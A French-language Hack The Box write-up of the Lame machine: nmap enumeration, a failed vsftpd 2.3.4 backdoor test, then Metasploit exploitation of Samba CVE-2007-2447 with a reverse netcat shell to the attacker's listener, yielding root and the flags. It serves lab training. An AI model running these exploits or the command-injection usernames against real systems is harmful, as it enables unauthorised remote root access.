---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Lame — HTB Easy Writeup & Walkthrough"
linkTitle: "Lame"
slug: "lame"
date: 2026-02-04T15:25:02+01:00
#lastmod: 2026-02-04T15:25:02+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Lame (HTB Easy) : énumération, piste FTP écartée, puis exploitation de Samba jusqu’à l’accès root."
description: "Writeup de Lame (HTB Easy) : énumération méthodique, validation de la piste FTP, exploitation de Samba, puis accès root expliqué étape par étape."
tags: ["Hack The Box","HTB Easy","linux-privesc","FTP","SMB","Samba","CVE-2007-2447"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Lame HTB Easy exploitée via des services FTP et SMB, expliquée étape par étape jusqu’à l’accès root."
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Lame"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","FTP","SMB","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Lame> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

`Lame` est une machine **Easy** de **Hack The Box** conçue pour t’entraîner à l’analyse de services réseau classiques. Plusieurs services sont exposés avec des versions connues pour contenir des vulnérabilités, mais toutes ne sont pas exploitables en pratique. L’objectif est donc d’identifier la bonne piste, de la valider méthodiquement, puis d’obtenir l’accès aux flags `user.txt` et `root.txt`.

Dans ce writeup, tu suis une démarche progressive et reproductible. Tu commences par cartographier les ports et services avec `{{< script "mon-nmap" >}}`, puis tu testes les pistes les plus évidentes dans un ordre logique. Le scan met en évidence deux services principaux : **FTP (vsftpd 2.3.4)** et **SMB (Samba 3.0.20)**.

Tu démarres par le service FTP : l’accès anonyme est autorisé et la version est associée à une backdoor connue. Tu prends donc le temps de **valider cette piste** avec un PoC et Metasploit. L’absence de session exploitable te permet de l’écarter proprement, sans rester bloqué dessus.

Tu te concentres ensuite sur SMB. La version de Samba et les résultats d’énumération orientent vers une vulnérabilité critique : **Samba username map script (CVE-2007-2447)**.

L’exploitation de cette faille permet d’obtenir directement un **shell root**, sans étape intermédiaire d’escalade de privilèges. Tu peux alors récupérer `user.txt` et `root.txt` immédiatement.

> Pour la petite histoire, **Lame** est la **première machine publiée sur Hack The Box**, le **14 mars 2017**. Elle reste aujourd’hui un excellent exercice pour poser des bases solides en CTF.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :


```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt lame.htb
Nmap scan report for lame.htb (10.129.x.x)
Host is up (0.014s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 26.46 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans `scans_nmap/enum_ftp_smb_scan.txt`

Sur lame.htb, cette phase est exécutée.

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,139,445 --script=ftp-anon,ftp-syst,smb-os-discovery,smb-enum-shares,smb-enum-users --script-timeout=30s -T4 -oN scans_nmap/enum_ftp_smb_scan.txt lame.htb
Nmap scan report for lame.htb (10.129.x.x)
Host is up (0.97s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.x.x
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OS: Unix

Host script results:
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Account disabled, Normal user account
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Account disabled, Normal user account
|   LAME\bind (RID: 1210)
|     Flags:       Account disabled, Normal user account
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Account disabled, Normal user account
|   LAME\dhcp (RID: 1202)
|     Flags:       Account disabled, Normal user account
|   LAME\distccd (RID: 1222)
|     Flags:       Account disabled, Normal user account
|   LAME\ftp (RID: 1214)
|     Flags:       Account disabled, Normal user account
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Account disabled, Normal user account
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Account disabled, Normal user account
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Account disabled, Normal user account
|   LAME\klog (RID: 1206)
|     Flags:       Account disabled, Normal user account
|   LAME\libuuid (RID: 1200)
|     Flags:       Account disabled, Normal user account
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Account disabled, Normal user account
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Account disabled, Normal user account
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Account disabled, Normal user account
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Account disabled, Normal user account
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Account disabled, Normal user account
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Account disabled, Normal user account
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Account disabled, Normal user account
|   LAME\postfix (RID: 1212)
|     Flags:       Account disabled, Normal user account
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Account disabled, Normal user account
|   LAME\proftpd (RID: 1226)
|     Flags:       Account disabled, Normal user account
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Account disabled, Normal user account
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Account disabled, Normal user account
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Account disabled, Normal user account
|   LAME\sshd (RID: 1208)
|     Flags:       Account disabled, Normal user account
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Account disabled, Normal user account
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Account disabled, Normal user account
|   LAME\syslog (RID: 1204)
|     Flags:       Account disabled, Normal user account
|   LAME\telnetd (RID: 1224)
|     Flags:       Account disabled, Normal user account
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Account disabled, Normal user account
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Account disabled, Normal user account
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Account disabled, Normal user account
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-02-04T08:10:42-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 43.71 seconds
```


### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect) pour lame.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"21,22,139,445,3632" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "lame.htb"

# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p21,22,139,445,3632 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt lame.htb
Nmap scan report for lame.htb (10.129.x.x)
Host is up (0.40s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose|remote management|webcam|firewall|storage-misc
Running (JUST GUESSING): Linux 2.4.X|2.6.X (95%), Belkin embedded (88%), Control4 embedded (88%), Mobotix embedded (88%), Dell embedded (88%), HID embedded (88%), IBM embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.30 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:2.4.18 cpe:/o:linux:linux_kernel:2.6.18 cpe:/h:belkin:n300 cpe:/h:hid:edgeplus_solo_es400 cpe:/h:ibm:ds4700
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (95%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (93%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (93%), Linux 2.4.18 (93%), Linux 2.6.18 (91%), Linux 2.6.23 (91%), OpenWrt (Linux 2.4.30 - 2.4.34) (90%), OpenWrt (Linux 2.4.32) (88%), Belkin N300 WAP (Linux 2.6.30) (88%), Control4 HC-300 home controller or Mobotix M22 camera (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   946.51 ms 10.10.x.x
2   946.50 ms lame.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 21.71 seconds

```



### Scan ciblé CMS

Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p21,22,139,445,3632 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt lame.htb
Nmap scan report for lame.htb (10.129.x.x)
Host is up (0.030s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 13.09 seconds

```



### Scan UDP rapide

Le scan UDP rapide est enregistré dans le fichier `scans_nmap/udp_vuln_scan.txt`.

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt lame.htb
Nmap scan report for lame.htb (10.129.x.x)
Host is up (0.57s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 7.32 seconds

```

------

Ici, tu ne lances pas `mon-recoweb` ni `mon-subdomains`, le scan initial n’ayant révélé aucun service HTTP/HTTPS sur la machine.

## Prise pied

À partir des informations fournies par `mon-nmap`, tu définis une approche simple : tester en priorité le service **FTP (vsftpd 2.3.4)**, puis basculer vers **SMB (Samba 3.0.20)** si la première piste n’aboutit pas.

Tu commences par analyser le service **FTP (port 21)**.

### FTP

Tu commences par tester l’accès FTP anonyme, autorisé par `nmap`, afin de vérifier si des fichiers sont accessibles sans authentification.

#### Anonymous FTP

```bash
ftp lame.htb
Connected to lame.htb.
220 (vsFTPd 2.3.4)
Name (lame.htb:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls -la
229 Entering Extended Passive Mode (|||28060|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp>
```

Le service FTP accepte les connexions anonymes, mais le répertoire accessible est vide.

Tu recherches ensuite les vulnérabilités connues associées à cette version avec `searchsploit`.

#### Searchsploit



```bash
searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                         | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                            | unix/remote/17491.rb
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```



Comme `searchsploit` remonte deux entrées pour **vsftpd 2.3.4**, tu commences par les récupérer en local pour comprendre ce qui est exploité, avant de lancer un test.



```bash
searchsploit -m unix/remote/49757.py
searchsploit -m unix/remote/17491.rb
```

---

Les deux fichiers pointent vers la même vulnérabilité (**CVE-2011-2523**) : une version compromise de **vsftpd 2.3.4** contient une porte dérobée.

Un nom d’utilisateur se terminant par `:)` déclenche l’ouverture d’un **shell bind** sur le port **6200/tcp**.

Si la backdoor est présente, un service shell est alors accessible sur ce port.

#### POC



```bash
python3 49757.py lame.htb
Traceback (most recent call last):
  File "/mnt/kvm-md0/HTB/lame/49757.py", line 37, in <module>
    tn2=Telnet(host, 6200)
  File "/usr/lib/python3/dist-packages/telnetlib/__init__.py", line 219, in __init__
    self.open(host, port, timeout)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/telnetlib/__init__.py", line 236, in open
    self.sock = socket.create_connection((host, port), timeout)
                ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/socket.py", line 864, in create_connection
    raise exceptions[0]
  File "/usr/lib/python3.13/socket.py", line 849, in create_connection
    sock.connect(sa)
    ~~~~~~~~~~~~^^^^
TimeoutError: [Errno 110] Connection timed out
```

<br>

Le PoC Python3 est exécuté. La connexion au port **6200/tcp** échoue avec un *timeout* et aucun *bind shell* n’est ouvert.

Tu utilises ensuite le module **Metasploit** correspondant à **vsftpd 2.3.4** pour vérifier cette piste.

#### Métasploit

Lance métasploit :

```bash
msfconsole           
Metasploit tip: To save all commands executed since start up to a file, use the 
makerc command
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v6.4.110-dev                               ]
+ -- --=[ 2,601 exploits - 1,322 auxiliary - 1,707 payloads     ]
+ -- --=[ 431 post - 49 encoders - 14 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf >
```

L’exploitation via **Metasploit** se fait selon le déroulement habituel : `search` pour identifier le module, `use` pour le charger, `show options` pour vérifier les paramètres attendus, `set` pour configurer la cible, puis `run` pour lancer le test.

```bash
msf > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf > 

```



La recherche dans **Metasploit** confirme l’existence d’un module dédié à la vulnérabilité **vsftpd 2.3.4 Backdoor Command Execution**. Ce module va maintenant être utilisé afin de vérifier définitivement si la backdoor est exploitable sur la machine cible.

> Note : l’IP HTB peut changer après un reset ; garde la tienne comme source de vérité au moment des tests.

```bash
msf > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
                                       xies: socks4, socks5, socks5h, http, sapni
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST lame.htb
RHOST => lame.htb
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported pro
                                       xies: socks4, socks5, socks5h, http, sapni
   RHOSTS   lame.htb         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.129.x.x:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.x.x:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/vsftpd_234_backdoor) > 
```

#### Bilan (FTP)

Le module **Metasploit** `vsftpd_234_backdoor` confirme le résultat du PoC Python : aucune session n’est créée.

La backdoor **vsftpd 2.3.4** n’est pas présente. La piste FTP est écartée.

Tu poursuis l’analyse avec le service **SMB**, identifié lors de l’énumération initiale.

### SMB

Tu recherches les vulnérabilités connues associées à la version du service **SMB (Samba 3.0.20)** avec `searchsploit`.

#### Searchsploit

```bash
searchsploit samba 3.0.20
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                           | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                              | linux_x86/dos/36741.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

La recherche avec `searchsploit` met en évidence plusieurs vulnérabilités affectant **Samba 3.0.20**.

Parmi celles-ci, une vulnérabilité permet l’exécution de commandes à distance via le mécanisme **`username map script`**. Un module **Metasploit** est disponible pour cette faille.

Comme pour FTP, tu récupères le script référencé par `searchsploit` afin de comprendre le fonctionnement de la vulnérabilité avant toute tentative d’exploitation.

```basic
searchsploit -m unix/remote/16320.rb
```

La lecture du script montre qu’il s’agit d’un module **Metasploit** exploitant la vulnérabilité **CVE-2007-2447**, liée au mécanisme `username map script` de Samba.

Lorsque cette option est activée, Samba exécute un script externe en utilisant le nom d’utilisateur fourni, avant toute authentification. Dans les versions vulnérables, cette valeur n’est pas correctement filtrée, ce qui permet d’y injecter des commandes système.

Au lieu d’un simple nom d’utilisateur, il est possible de fournir une chaîne contenant une commande, par exemple `/=whoami` ou `/=cat /etc/passwd`.

Cette commande est exécutée avec les privilèges du service Samba, c’est-à-dire **root**, ce qui permet une exécution de commandes à distance sans identifiants valides.

#### POC

Le script **`16320.rb`** est un module **Metasploit**. Il ne peut pas être exécuté seul pour réaliser un PoC indépendant.

Son exploitation passe par **Metasploit**, qui gère la communication SMB, l’injection du nom d’utilisateur malveillant et l’exécution des commandes sur la cible.

#### Métasploit

Pour exploiter cette vulnérabilité via **Metasploit**, tu appliques exactement la même procédure que pour FTP : **rechercher** le module avec `search`, **le charger** avec `use`, **consulter les options** avec `show options`, **configurer les paramètres nécessaires** avec `set`, puis **lancer l’exploitation** avec `run`.

```bash
msf > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:
                                       host:port[,type:host:port][..
                                       .]. Supported proxies: socks4
                                       , socks5, socks5h, http, sapn
                                       i
   RHOSTS                    yes       The target host(s), see https
                                       ://docs.metasploit.com/docs/u
                                       sing-metasploit/basics/using-
                                       metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.241    yes       The listen address (an interfac
                                     e may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > set RHOSTS lame.htb
RHOSTS => lame.htb
msf exploit(multi/samba/usermap_script) > set LHOST tun0
LHOST => 10.10.x.x
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:
                                       host:port[,type:host:port][..
                                       .]. Supported proxies: socks4
                                       , socks5, socks5h, http, sapn
                                       i
   RHOSTS   lame.htb         yes       The target host(s), see https
                                       ://docs.metasploit.com/docs/u
                                       sing-metasploit/basics/using-
                                       metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.x.x     yes       The listen address (an interfac
                                     e may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.x.x:4444 
[*] Command shell session 1 opened (10.10.x.x:4444 -> 10.129.x.x:40485) at [date] 17:26:52 +0100


```

Le module cible le port 139 (netbios-ssn), point d’entrée du service Samba.

Une fois la session ouverte, tu vérifies le contexte d’exécution et constates que tu disposes directement des privilèges **root**.

La commande injectée est exécutée avec les privilèges du service Samba, qui tourne en root. Aucune phase d’escalade de privilèges n’est nécessaire.

```bash
whoami
root
pwd
/
ls -l /home/
total 16
drwxr-xr-x 2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x 4 makis   makis   4096 Feb  5 06:25 makis
drwxr-xr-x 2 service service 4096 Apr 16  2010 service
drwxr-xr-x 3    1001    1001 4096 May  7  2010 user

ls -l /home/makis
total 4
-rw-r--r-- 1 makis makis 33 Feb  5 03:58 user.txt

cat /home/makis/user.txt       
899bxxxxxxxxxxxxxxxxxxxxxxxx7743

cat /root/root.txt
67c4xxxxxxxxxxxxxxxxxxxxxxxx9acf

```



#### Bilan (SMB)

La vulnérabilité **Samba `username map script`** permet une exécution de commandes à distance sans authentification, avec les privilèges **root**.

L’exécution se fait directement dans le contexte du service Samba, qui tourne en root. Aucune phase d’escalade de privilèges n’est nécessaire.




---

## Conclusion

La machine **Lame** met en avant l’importance d’une **énumération rigoureuse** et d’une validation systématique de chaque piste identifiée. Dès le scan initial, plusieurs services ressortent, notamment **FTP** et **SMB**, associés à des versions historiquement vulnérables.

Dans ce challenge, **vsftpd 2.3.4** constitue une fausse piste typique. Même si la backdoor est bien documentée, les tests réalisés (PoC manuel et module Metasploit) montrent qu’elle n’est pas exploitable dans cet environnement. Cette étape reste essentielle, car elle permet de **valider ou d’écarter une hypothèse de manière fiable**, sans supposition.

La compromission repose finalement sur la vulnérabilité **Samba username map script (CVE-2007-2447)**. Son exploitation permet une **exécution de commandes à distance sans authentification**, directement avec les **privilèges root**. L’accès aux fichiers `user.txt` et `root.txt` est immédiat, sans nécessiter d’escalade de privilèges.

Ce challenge permet de retenir plusieurs points clés :

- **valider chaque vulnérabilité en conditions réelles**, même si elle est connue,
- **tester les pistes dans un ordre logique**, sans se focaliser trop tôt sur une seule,
- **analyser l’impact concret d’une faille**, plutôt que d’enchaîner les exploits sans compréhension.

**Lame** constitue ainsi une excellente base pour appliquer une méthodologie CTF structurée, reproductible et directement réutilisable sur d’autres machines Hack The Box.

---

{{< feedback >}}
